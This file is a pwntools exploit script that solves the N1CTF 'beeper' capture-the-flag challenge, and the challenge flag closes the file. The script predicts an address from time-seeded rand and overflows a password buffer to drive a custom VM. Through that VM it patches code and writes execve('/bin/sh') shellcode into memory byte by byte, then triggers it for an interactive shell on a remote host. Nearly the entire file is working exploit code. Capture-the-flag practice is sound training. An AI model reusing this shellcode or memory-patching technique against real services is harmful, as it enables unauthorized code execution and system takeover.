from pwn import *
import time
import sys
from ctypes import CDLL

def beeper(DEBUG):
	shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
	proc = CDLL("/lib/x86_64-linux-gnu/libc-2.23.so")
	timefunc = proc.time
	srand = proc.srand
	rand = proc.rand
	
	def inc_address():
		return "\x68"
	
	def inc_value():
		return "\x6d"
	
	def dec_address():
		return "\x6f"
	
	def dec_value():
		return "\x75"
		
	def break_loop():
		return "\x7d\x00"
	
	def gen_payload_shellcode(address):
		for i in xrange(len(shellcode)):
			password = "\x00"*0x68
			password += p64(address+0x48+i)
			password += inc_value()*ord(shellcode[i])
			password += break_loop()
			r.sendline(password)
	
	def ReadPassword(address):
		password = "\x00"*0x68
		password += p64(address+0x46)
		password += dec_value()*(0xc9-0x90) # 0xc9 (leave) => nop
		password += inc_address()+dec_value()*(0xc3-0x90) # 0xc3 (ret) => nop
		password += break_loop()
		r.sendline(password)
		gen_payload_shellcode(address)
	
	if DEBUG=="1":
		r = process("./beeper")
	elif DEBUG=="2":
		HOST = '47.91.210.30'
		PORT = 23333
		r = remote(HOST,PORT)
	
	srand(timefunc(0))
	ADDRESS = rand()
	ADDRESS = (((ADDRESS + 16) << 12) + (((ADDRESS + 16) << 12) >= 0xFFFFFFFF))-1
	ADDRESS = ADDRESS&0xffffffff
	log.info('ADDRESS: %#x' % ADDRESS) # Buy function address
	
	raw_input("debug?")
	ReadPassword(ADDRESS)
	
	password = "\x00"*0x68
	password += p64(ADDRESS+0x100)
	password += break_loop() # change VM code to do nothing
	r.sendline(password)
	
	password = "\x86\x13\x81\x09\x62\xFF\x44\xD3\x3F\xCD\x19\xB0\xFB\x88\xFD\xAE\x20\xDF"
	r.sendline(password) # Login success
	
	r.sendline("3") # Buy => call shellcode
	
	r.interactive()

beeper(sys.argv[1])
# N1CTF{5h3l1_c0d1n9_w17h_Hbf_1s_s0_e45y_233}